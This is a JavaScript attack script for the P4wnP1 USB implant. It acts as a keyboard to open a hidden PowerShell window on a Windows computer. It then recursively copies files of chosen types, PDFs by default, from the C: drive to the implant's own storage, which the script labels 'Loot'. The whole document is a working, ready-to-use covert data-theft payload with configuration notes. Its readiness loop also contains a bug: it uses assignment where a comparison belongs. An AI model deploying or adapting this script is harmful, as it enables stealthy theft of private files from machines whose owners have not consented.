/*###################################################################################
# Windows_file_extractor.js                                                         #
# Author: Saytonic https://youtu.be/I_BjCdJlCo4                                     #
# Edited by: Coderdude112 on GitHub                                                 #
# This script will gather all files with a matching file_type on the search_drive   #
# PREREQUISTES:                                                                     #
# Enable the keyboard and USB storage on your P4wnP1                                #
# Set the name of the P4wnP1 USB storage device to the variable usb_drive           #
# Set the file types you want to exfiltrate to the file_type variable               #
# Set the letter of the drive you want to exfiltrate to the search_drive variable   #
###################################################################################*/

// Set the keyboard layout and speed
layout('us');   // Set keyboard layout to US
typingSpeed(0,0);   // Sets the typing speed to super super fast

// Define all variables, arrays, ect
var delay_time = 5          // The time to wait before executing the attack in seconds
var ready = "False"         // Used to make sure that the attack is ready to be executed
var usb_drive = "SNEAKY"    // The name of the P4wnP1's USB storage device
var file_type = ["*.pdf"]   // The types of files to extract
var search_drive = ["C:"]   // The drives to search for files that match file_type

function attack() {
    press("GUI r");
    delay(500);
    type("powershell\n");   // Open a powershell menu
    delay(1000);

    type("powershell -windowstyle hidden {");   // Makes the powershell window hidden for the duration of the attack

    type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq '" + usb_drive + "' } | select name;");  // Find the USB drive with the same name as the P4wnP1's name and save it as $usbPath
    type("$lootPath = $usbPath.name + \"Loot\\File-exfiltrator\";mkdir $lootPath;");    // Make the full loot path variable and then create it

    type("Get-ChildItem C: -Recurse -Include " + file_type + " | ForEach-Object ` {copy $_ -Destination $lootPath};");  // Get the files that match the file_type in Windows folders (3D Objects, Desktop, ect.)
    type("Get-ChildItem " + search_drive + "\\ -Recurse -Include " + file_type + " | ForEach-Object ` {copy $_ -Destination $lootPath};");  // Get the files from the search_drive

    type("exit;}\n");   // Exit the powershell window and add the closing bracket to make the powershell window hidden
}
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");    // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10) // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {    // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True"; // Stop the while loop
            break;
        }
    }
}

delay(delay_time * 100);
check_if_ready();
attack();
